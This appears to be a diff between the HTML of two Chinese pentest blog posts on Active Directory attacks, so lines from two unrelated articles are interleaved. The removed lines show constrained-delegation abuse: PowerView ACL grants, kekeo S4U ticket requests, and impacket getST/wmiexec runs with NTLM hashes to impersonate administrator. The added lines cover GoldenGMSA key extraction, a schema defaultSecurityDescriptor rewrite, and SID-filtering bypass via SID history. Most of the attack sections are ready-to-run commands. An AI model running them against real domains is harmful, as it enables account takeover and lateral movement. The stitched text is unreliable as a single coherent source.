-<p>添加jack对PC-MICLE-KIT$的完全控制权限   <strong><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">PowerView</a></strong></p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#获取PC-MICLE-KIT的objectguid</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainComputer</span> <span class="nb">PC-MICLE</span><span class="n">-KIT</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c">#配置jack对PC-MICLE-KIT机器账号的所有权限，（必须配置，不然是无法修改账户属性的）</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Add-DomainObjectAcl</span> <span class="n">-TargetIdentity</span> <span class="s1">&#39;b6283bcb-c141-4a53-99dd-a8d8a50a7b8d&#39;</span> <span class="n">-PrincipalIdentity</span> <span class="n">jack</span> <span class="n">-Rights</span> <span class="n">All</span> <span class="n">-Verbose</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c">#如果利用的是普通域用户的话，获得域用户控制权限后还需要为域用户设置spn，机器用户就跳过这步。</span>
-</span></span><span class="line"><span class="cl"><span class="n">setspn</span> <span class="n">-a</span> <span class="n">test</span><span class="p">/</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span> <span class="n">test</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c">#验证权限，jack的sid</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainObjectAcl</span> <span class="n">-Identity</span> <span class="nb">PC-MICLE</span><span class="n">-KIT</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">SecurityIdentifier</span> <span class="o">-match</span> <span class="s2">&#34;S-1-5-21-3759881954-2993291187-3577547808-1135&#34;</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c">#删除权限</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Remove-DomainObjectAcl</span> <span class="n">-TargetIdentity</span> <span class="s2">&#34;b6283bcb-c141-4a53-99dd-a8d8a50a7b8d&#34;</span> <span class="n">-PrincipalIdentity</span> <span class="n">jack</span> <span class="n">-Rights</span> <span class="n">all</span> <span class="n">-Verbose</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div></li>
-<li>
-<p>在jack会话中配置PC-MICLE-KIT到owa2013.rootkit.org的约束委派</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#方法一 PowerView</span>
-</span></span><span class="line"><span class="cl"><span class="c">#查看PC-MICLE-KIT机器账号的委派设置情况</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Get-DomainObject</span> <span class="nb">PC-MICLE</span><span class="n">-KIT</span> <span class="n">-Properties</span> <span class="n">distinguishedname</span><span class="p">,</span><span class="n">useraccountcontrol</span><span class="p">,</span><span class="n">serviceprincipalname</span><span class="p">,</span><span class="nb">msds-allowedtodelegateto</span> <span class="p">|</span><span class="nb">fl
-</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="c">#配置PC-MICLE-KIT到owa2013 CIFS服务的约束委派: 4096(WORKSTATION_TRUST_ACCOUNT)+16777216(TRUSTED_TO_AUTH_FOR_DELEGATION)=16781312</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Set-DomainObject</span> <span class="nb">PC-MICLE</span><span class="n">-KIT</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">&#39;msds-allowedtodelegateto&#39;</span><span class="p">=</span><span class="s1">&#39;CIFS/owa2013.rootkit.org&#39;</span><span class="p">;</span><span class="s1">&#39;useraccountcontrol&#39;</span><span class="p">=</span><span class="n">16781312</span><span class="p">}</span> <span class="n">-verbose</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c">#方法二 [Microsoft.ActiveDirectory.Management.dll](&lt;https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll&gt;)</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Import-module</span> <span class="p">.\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">ActiveDirectory</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">dll</span>
-</span></span><span class="line"><span class="cl"><span class="c">#用户的话使用$user = Get-ADUser test</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$user</span> <span class="p">=</span> <span class="nb">Get-ADComputer</span> <span class="nb">PC-MICLE</span><span class="n">-KIT</span>
-</span></span><span class="line"><span class="cl"><span class="c">#配置PC-MICLE-KIT到krbtgt服务的约束委派（只能2008及其以前的KDC支持）</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Set-ADObject</span> <span class="nv">$user</span> <span class="n">-Add</span> <span class="p">@{</span><span class="s2">&#34;msDS-AllowedToDelegateTo&#34;</span> <span class="p">=</span> <span class="p">@(</span><span class="s2">&#34;krbtgt/rootkit.org&#34;</span><span class="p">)}</span> <span class="o">-Replace</span> <span class="p">@{</span><span class="s2">&#34;useraccountcontrol&#34;</span><span class="p">=</span><span class="n">16781312</span><span class="p">}</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div></li>
-</ul>
-</li>
-<li>
-<p><strong>用<code>PC-MICLE-KIT$</code>账号发起s4u2self和s4u2proxy请求</strong></p>
-<ul>
-<li>
-<p>如果配置到<code>CIFS/owa2013.rootkit.org</code>服务的约束委派，那么模拟administrator访问owa2013.rootkit.org CIFS服务</p>
+<p><strong>Golden gMSA</strong></p>
+<p>GoldenGMSA 工具使用 LDAP 通过读取<code>CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,DC=root,DC=local</code>中 <code>msKds-ProvRootKey</code> 对象的属性来获取密钥。所以同理，在子域以system权限执行，可以读取其本地副本的对象。</p>
+<p><a href="https://github.com/Semperis/GoldenGMSA" target="_blank" rel="noopener">https://github.com/Semperis/GoldenGMSA</a></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -595,42 +547,54 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#keko</span>
-</span></span><span class="line"><span class="cl"><span class="c">#生成TGT票据</span>
-</span></span><span class="line"><span class="cl"><span class="n">tgt</span><span class="p">::</span><span class="n">ask</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="nb">PC-MICLE</span><span class="n">-KIT</span><span class="p">$</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">ntlm</span><span class="err">:</span><span class="n">a15bc42b9f1f1daa812a0b75a4c775c4</span>
-</span></span><span class="line"><span class="cl"><span class="c">#发起s4u请求</span>
-</span></span><span class="line"><span class="cl"><span class="n">tgs</span><span class="p">::</span><span class="n">s4u</span> <span class="p">/</span><span class="n">tgt</span><span class="err">:</span><span class="nb">TGT_PC-MICLE</span><span class="n">-KIT</span><span class="p">$</span><span class="nv">@ROOTKIT</span><span class="p">.</span><span class="n">ORG_krbtgt</span><span class="p">~</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span><span class="nv">@ROOTKIT</span><span class="p">.</span><span class="n">ORG</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">administrator</span><span class="nv">@rootkit</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="n">CIFS</span><span class="p">/</span><span class="n">owa2013</span><span class="p">.</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span>
-</span></span><span class="line"><span class="cl"><span class="c">#ptt</span>
-</span></span><span class="line"><span class="cl"><span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="n">TGS_administrator</span><span class="nv">@rootkit</span><span class="p">.</span><span class="n">org</span><span class="nv">@ROOTKIT</span><span class="p">.</span><span class="n">ORG_CIFS</span><span class="p">~</span><span class="n">owa2013</span><span class="p">.</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span><span class="nv">@ROOTKIT</span><span class="p">.</span><span class="n">ORG</span><span class="p">.</span><span class="n">kirbi</span>
-</span></span><span class="line"><span class="cl"><span class="nb">dir </span><span class="p">\\</span><span class="n">owa2013</span><span class="p">.</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#在子域域控以system权限执行</span>
+</span></span><span class="line"><span class="cl"><span class="c">#在线计算</span>
+</span></span><span class="line"><span class="cl"><span class="n">GoldenGMSA</span><span class="p">.</span><span class="n">exe</span> <span class="n">compute</span> <span class="p">-</span><span class="n">-sid</span> <span class="s2">&#34;5-1-5-21-3721226516-2472762132-231580280-1601&#34;</span> <span class="p">-</span><span class="n">-forest</span> <span class="n">child</span><span class="p">.</span><span class="n">root</span><span class="p">.</span><span class="n">local</span> <span class="p">-</span><span class="n">-domain</span> <span class="n">root</span><span class="p">.</span><span class="n">local</span>
+</span></span><span class="line"><span class="cl"><span class="c">#还可以本地计算</span>
+</span></span><span class="line"><span class="cl"><span class="n">GoldenGMSA</span><span class="p">.</span><span class="n">exe</span> <span class="n">kdsinfo</span> <span class="n">-forest</span> <span class="n">child</span><span class="p">.</span><span class="n">root</span><span class="p">.</span><span class="n">local</span>
+</span></span><span class="line"><span class="cl"><span class="n">GoldenGMSA</span><span class="p">.</span><span class="n">exe</span> <span class="n">gmsainfo</span> <span class="p">-</span><span class="n">-domain</span> <span class="n">root</span><span class="p">.</span><span class="n">local</span>
+</span></span><span class="line"><span class="cl"><span class="c">#kdskey和pwdid参数值为前两条命令执行结果</span>
+</span></span><span class="line"><span class="cl"><span class="n">GoldenGMSA</span><span class="p">.</span><span class="n">exe</span> <span class="n">compute</span> <span class="p">-</span><span class="n">-sid</span><span class="s2">&#34;5-1-5-21-3721226516-2472762132-231580280-1601&#34;</span> <span class="p">-</span><span class="n">-kdskey</span> <span class="n">xxxxx</span> <span class="p">-</span><span class="n">-pwdid</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 <li>
-<p>如果配置到krbtgt（即TGS服务）的约束委派</p>
-<p><strong>Tips:</strong> 黄金票据是通过用<code>krbtgt</code>的hash来伪造TGT。而创建到krbtgt用户的约束委派也能达到同样的效果。TGS服务器默认的SPN是<code>krbtgt/domain name</code>。（只适用于2008及之前的KDC，2012的域控上未成功，2012及以后的KDC，受限委派的时候用的机制变成了基于资源的委派，已测试）</p>
+<p>利用<strong>schema 分区</strong></p>
+<p>之前也介绍过活动目录的schema分区包含对林中创建的每个对象的定义，也包含对活动目录中每个对象的属性的定义。例如<code>defaultSecurityDescriptor</code> 属性为新创建对象的默认ACL。</p>
+<p>在子域上直接以system 权限修改Schema 中的<code>defaultSecurityDescriptor</code> 对象会报错。但可以先添加一个指定用户对<code>CN=Schema,CN=Configuration,DC=root,DC=local</code> 对象的写权限，并继承到所有的classSchema对象。</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
+</span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">getST</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.1.10</span> <span class="o">-</span><span class="n">spn</span> <span class="n">krbtgt</span><span class="o">/</span><span class="mi">0</span><span class="n">day</span><span class="o">.</span><span class="n">org</span> <span class="o">-</span><span class="n">impersonate</span> <span class="n">administrator</span> <span class="mi">0</span><span class="n">day</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">PC</span><span class="o">-</span><span class="n">JACK</span><span class="o">-</span><span class="mi">0</span><span class="n">DAY</span><span class="err">$</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="mi">35</span><span class="n">c7a1ec7ab4df8d073abe65e5375f3a</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#这里的krbtgt的TGS票据，相当于TGT票据</span>
-</span></span><span class="line"><span class="cl"><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="o">=</span><span class="n">administrator</span><span class="o">.</span><span class="n">ccache</span>
-</span></span><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">wmiexec</span><span class="o">.</span><span class="n">py</span> <span class="mi">0</span><span class="n">day</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">administrator</span><span class="nd">@OWA2010SP3</span><span class="mf">.0</span><span class="n">day</span><span class="o">.</span><span class="n">org</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span> <span class="o">-</span><span class="n">k</span> 
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#获取defaultSecurityDescriptor属性现有的默认acl</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-ADObject</span> <span class="s2">&#34;CN=User,CN=Schema,CN=Configuration,DC=root,DC=local&#34;</span> <span class="n">-Properties</span> <span class="n">defaultSecurityDescriptor</span> <span class="p">|</span> <span class="nb">select </span><span class="n">defaultSecurityDescriptor</span> <span class="p">|</span><span class="nb">ft </span><span class="n">-Wrap</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#修改defaultSecurityDescriptor属性的ACL</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-ADObject</span> <span class="n">-Identity</span> <span class="s2">&#34;CN=User,CN=Schema,CN=Configuration,DC=root,DC=local&#34;</span> <span class="o">-Replace</span> <span class="p">@{</span><span class="n">defaultSecurityDescriptor</span><span class="p">=</span><span class="s1">&#39;xxx&#39;</span><span class="p">;}</span> <span class="n">-Verbose</span> <span class="n">-Server</span> <span class="n">root</span><span class="p">.</span><span class="n">local</span>
 </span></span></code></pre></td></tr></table></div>
 </div>
-</div></li>
-</ul>
+</div><p>还有其他利用方式，比如删除属性的保密标志。</p>
 </li>
+<li>
+<p><strong>跨林的利用方法（同样适用于林内）</strong></p>
+<p>林信任是默认开启SID 过滤的且上面介绍的方法也仅限与林内。</p>
+<p>前提： A 林信任B 林。</p>
+<ol>
+<li>如果B 林中的用户本身在A 林中属于某个重要安全组的话，依然是可以利用的。</li>
+<li>如果A 林允许了历史sid，那么只会对ExtraSids字段的DA/EA/Account Operators组进行过滤。如果有高权限用户/组，且RID&gt;1000（例如exchange相关的组），那么就可以使用历史SID 伪造该组。</li>
 </ol>
+</li>
+</ul>
 <h2 id="参考"><a href="#参考" class="anchor-link">#</a><a href="#contents:参考" class="headings">参考</a></h2>
-<ol>
-<li><a href="https://www.anquanke.com/post/id/203151" target="_blank" rel="noopener">Windows内网协议学习LDAP篇之组策略</a></li>
-</ol>
+<p><a href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/" target="_blank" rel="noopener">Active Directory forest trusts part 1 - How does SID filtering work?</a></p>
+<p><a href="https://improsec.com/tech-blog/o83i79jgzk65bbwn1fwib1ela0rl2d" target="_blank" rel="noopener">SID filter as security boundary between domains? (Part 1)</a></p>
+<p><a href="https://blog.csdn.net/Fly_hps/article/details/80635803" target="_blank" rel="noopener">域、域树、域林、根域</a></p>
+<p><a href="https://www.geekby.site/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">基于域信任关系的域攻击</a> --文中有些许错误</p>
 
             </div>
 
@@ -644,7 +608,7 @@
                 
                 
                 
-                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/2021/09/%E7%BB%84%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" target="_blank" rel="noopener">https://myzxcg.com/2021/09/组策略利用与横向移动/</a></li>
+                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/2022/04/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E5%88%A9%E7%94%A8%E4%B8%8ESID-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/" target="_blank" rel="noopener">https://myzxcg.com/2022/04/域信任关系利用与SID-过滤绕过/</a></li>
             
             <li class="copyright-item license"><span class="copyright-item-text">许可</span>：<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></li>
             
@@ -678,6 +642,10 @@
                     </li>
                 
                     <li class="related-item">
+                        <a href="/2021/09/%E7%BB%84%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="related-link">组策略利用与横向移动</a>
+                    </li>
+                
+                    <li class="related-item">
                         <a href="/2021/08/%E5%9F%9F%E7%94%A8%E6%88%B7%E4%B8%8E%E5%9F%9F%E6%88%90%E5%91%98%E6%9C%BA%E5%99%A8%E5%85%B3%E7%B3%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" class="related-link">域用户与域成员机器关系及利用</a>
                     </li>
                 
@@ -687,10 +655,6 @@
                 
                     <li class="related-item">
                         <a href="/2021/08/Windows-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B%E4%B8%80/" class="related-link">Windows 访问控制模型（一）</a>
-                    </li>
-                
-                    <li class="related-item">
-                        <a href="/2022/04/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E5%88%A9%E7%94%A8%E4%B8%8ESID-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/" class="related-link">域信任关系利用与SID 过滤绕过</a>
                     </li>
                 
             </ul>
@@ -705,7 +669,7 @@
         
     <footer class="minimal-footer">
         
-            <div class="post-tag"><a href="/tags/Windows/" rel="tag" class="post-tag-link">#windows</a> <a href="/tags/%E5%9F%9F%E7%9B%B8%E5%85%B3/" rel="tag" class="post-tag-link">#域相关</a></div>
+            <div class="post-tag"><a href="/tags/%E5%9F%9F%E7%9B%B8%E5%85%B3/" rel="tag" class="post-tag-link">#域相关</a> <a href="/tags/Windows/" rel="tag" class="post-tag-link">#windows</a></div>
         
         
         
@@ -728,13 +692,9 @@
     
         <ul class="post-nav">
             
-                <li class="post-nav-prev">
-                    <a href="/2021/10/%E5%9F%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/" rel="prev">&lt; 域委派利用</a>
-                </li>
-            
             
                 <li class="post-nav-next">
-                    <a href="/2021/08/%E5%9F%9F%E7%94%A8%E6%88%B7%E4%B8%8E%E5%9F%9F%E6%88%90%E5%91%98%E6%9C%BA%E5%99%A8%E5%85%B3%E7%B3%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" rel="next">域用户与域成员机器关系及利用 &gt;</a>
+                    <a href="/2022/03/Cobalt-Strike-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%80/" rel="next">Cobalt Strike 代码分析(一) &gt;</a>
                 </li>
             
         </ul>
